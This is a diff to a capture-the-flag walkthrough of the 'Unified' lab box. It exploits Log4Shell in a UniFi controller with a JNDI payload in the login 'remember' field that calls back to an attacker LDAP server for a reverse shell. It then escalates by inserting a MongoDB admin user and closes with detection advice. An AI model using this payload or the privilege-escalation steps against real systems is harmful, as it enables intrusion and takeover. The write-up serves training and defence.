@@ -19,7 +19,7 @@ A technical walkthrough of exploiting **CVE-2021-44228 (Log4Shell)** in a UniFi 
 | Attribute | Details |
 | :--- | :--- |
 | **Box/Challenge** | Unified |
-| **Target IP** | `10.10.25.200` |
+| **Target IP** | `10.129.101.35` |
 | **OS** | Linux |
 | **Key Vulnerabilities**| Log4Shell (CVE-2021-44228), MongoDB Misconfiguration |
 
@@ -31,25 +31,25 @@ A technical walkthrough of exploiting **CVE-2021-44228 (Log4Shell)** in a UniFi 
  ### Nmap Scan
  An `nmap` scan was performed to get a detailed service version enumeration.
  ```bash 
- nmap -sC -sV 10.10.25.200
+ nmap -sC -sV 10.129.101.35
  ```  
  ![NMAP scan result](img/Nmap_scan.png)
+ 
 The scan results revealed several open ports:
 
 | Port | State | Service | Version |
 | :--- | :--- | :--- | :--- |
 | **22/tcp** | open | ssh | OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 |
-| **6789/tcp** | open | unifi | Ubiquiti UniFi Controller |
-| **8080/tcp** | open | http | nginx 1.18.0 (Ubuntu) |
-| **8443/tcp** | open | ssl/http | nginx 1.18.0 (Ubuntu) |
-| **8880/tcp** | open | http | nginx 1.18.0 (Ubuntu) |
+| **6789/tcp** | open | ibm-db2-admin? | Ubiquiti UniFi Controller |
+| **8080/tcp** | open | http | Apache Tomcat |
+| **8443/tcp** | open | ssl/http | Nagios NSCA |
 
  ### Web Enumeration 
- Navigating to `http://10.10.25.200:8080` automatically redirected to a login panel at `https://10.10.25.200:8443/manage`. 
+ Navigating to `http://10.129.101.35:8080` automatically redirected to a login panel at `https://10.129.101.35:8443/manage`. 
  
  ![UniFi web UI login page](img/Unifi_Login.png)
  
- - The web page identified the running software as **"UNIFI 6.5.54"**.
+ - The web page identified the running software as **"UNIFI 6.4.54"**.
  
 A quick search for vulnerabilities in this specific version of the Unifi Network Application immediately pointed to the critical **Log4Shell (CVE-2021-44228)** vulnerability. Further research confirmed that the `/api/login` endpoint, specifically the `remember` parameter, was a known injection point.
 
@@ -84,16 +84,22 @@ Next, we set up the Rogue-JNDI server to serve this payload.
  nc -nlvp 4444
 ```
 
-### Step 3: Trigger the Vulnerability
-We used Burp Suite to intercept the login request to `https://10.10.25.200:8443/api/login` and inject our JNDI payload into the `remember` parameter. 
+### Step 3: Triggering the Vulnerability
+
+**Phase 1: Verification (Out-of-Band)**
+Before sending a live reverse shell, it is best practice to verify the vulnerability using an Out-of-Band (OOB) DNS interaction. We intercepted the login request to `https://10.129.101.35:8443/api/login` and injected a JNDI payload pointing to a DNS logger into the `remember` parameter.
 
 ![Burp Log4shell Payload](img/Payload.png)
- ```json
+*(Note: The payload above successfully triggered a DNS pingback, confirming the target is vulnerable).*
+
+**Phase 2: Executing the Reverse Shell**
+Once confirmed, we updated the `remember` parameter payload to point back to our Rogue-JNDI server.
+```json
 {
-"username": "a",
-"password": "a",
-"remember": "${jndi:ldap://[ATTACKER_IP]:1389/o=tomcat}",
-"strict": true
+  "username": "root",
+  "password": "root",
+  "remember": "${jndi:ldap://10.10.17.85:1389/o=tomcat}",
+  "strict": true
 }
  ```
 Upon sending this request, the `nc` listener received a connection, granting us a shell as the `unifi` user. 
@@ -102,7 +108,7 @@ Upon sending this request, the `nc` listener received a connection, granting us 
  
 ```bash 
 listening on [any] 4444 ... 
-connect to [ATTACKER_IP] from (UNKNOWN) [10.10.25.200] 49496 
+connect to [ATTACKER_IP] from (UNKNOWN) [10.129.101.35] 59120 
 unifi@unifi:/$ whoami 
 unifi
 ```
@@ -124,6 +130,8 @@ This revealed a **MongoDB** instance running locally on port `27117`. Since it w
  
 Inside the `ace` database, we listed the existing admin users. 
 ```javascript > db.admin.find().forEach(printjson); ```
+
+ ![Other Users](img/Users_MongoDB.png)
 
 ### Step 2: Create a New Administrator User
 Instead of cracking existing hashes, we can create our own administrator account. First, we generate a SHA-512 password hash for our new user. 
@@ -165,7 +173,7 @@ With both IDs, we insert a record into the `privilege` collection to link our us
 Our user `unifi-admin` is now a full super administrator.
 
 ## 4. Root Access and Flags 
-With our newly created credentials (`unifi-admin`:`Password123`), we logged into the Unifi web interface at `https://10.10.25.200:8443`.
+With our newly created credentials (`unifi-admin`:`Password123`), we logged into the Unifi web interface at `https://10.129.101.35:8443`.
 
  ### Finding SSH Credentials
 Inside the admin panel, we navigated to **Settings > Site** and looked for the **Device Authentication** section. The application had conveniently stored the SSH credentials for the device's `root` user in plaintext. 
@@ -174,7 +182,7 @@ Inside the admin panel, we navigated to **Settings > Site** and looked for the *
 
 ### Gaining Root and Capturing Flags
 Using the discovered credentials, we logged in via SSH as `root`.
-```bash ssh root@10.10.25.200 ``` 
+```bash ssh root@10.129.101.35 ``` 
 From there, it was trivial to capture both the root and user flags.
 
  ![Root Flag](img/Root_flag.png)
@@ -186,13 +194,13 @@ From there, it was trivial to capture both the root and user flags.
 **User Flag:** ```bash root@unifi:~# cat /home/michael/user.txt {...user_flag_here...} ```
 
 
-🛡️ Detection & Mitigation (SOC Analyst Perspective)
+**🛡️ Detection & Mitigation (SOC Analyst Perspective)**
 This machine is a great example of how a single, critical vulnerability like Log4Shell can provide an immediate entry point, while secondary misconfigurations lead to total system compromise.
 
-How to Detect This Attack
--Network Monitoring: Monitor for outbound traffic on LDAP (1389) or RMI (1099) ports originating from web servers.
--Log Analysis: Search web access logs for common Log4j JNDI injection patterns (${jndi:ldap://).
--Process Creation: Alert on unexpected child processes spawned by Java (e.g., java spawning /bin/bash or curl).
+**How to Detect This Attack**
+1. **Network Monitoring:** Monitor for outbound traffic on LDAP (1389) or RMI (1099) ports originating from web servers.
+2. **Log Analysis:** Search web access logs for common Log4j JNDI injection patterns (${jndi:ldap://).
+3. **Process Creation:** Alert on unexpected child processes spawned by Java (e.g., java spawning /bin/bash or curl).
 
 
 **Key Takeaways:**
